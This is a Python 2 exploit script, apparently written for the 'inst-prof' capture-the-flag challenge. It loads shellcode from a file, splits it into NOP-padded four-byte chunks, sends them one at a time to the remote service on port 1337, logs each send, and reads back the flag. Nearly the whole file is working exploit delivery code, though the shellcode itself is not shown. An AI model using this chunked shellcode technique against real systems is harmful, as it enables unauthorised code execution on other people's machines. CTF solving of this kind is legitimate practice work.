import socket
import time

SERVER = '192.168.222.128'
SERVER = 'inst-prof.ctfcompetition.com'

def nop_pad(shit):
    return shit + '\x90' * (4-len(shit))
    
def send_with_log(s, f, stuff):
    s.sendall(stuff)
    f.write(stuff)

# get instrs and out-nopify it for splitting
instructions = open('shellcode', 'rb').read()
comms = instructions.split('\x90' * 5)
comms = comms[:len(comms) - 1]
print [repr(inst) for inst in comms]

# connect and get msgs
sock = socket.socket()
sock.connect((SERVER, 1337))
print sock.recv(24)
print sock.recv(20)
print "START THE GAME"

# log file
logf = open('send_log', 'wb')

# msgs check
print 'msgs:', len(comms)
for i in range(len(comms)):
    if len(comms[i]) > 4:
        print 'uh oh'
        print i
    
# send all comms with receiving answers
i = 0
for comm in comms:
    print i
    send_with_log(sock, logf, nop_pad(comm))
    print repr(sock.recv(8))
    i += 1

# get flag
print sock.recv(1000)

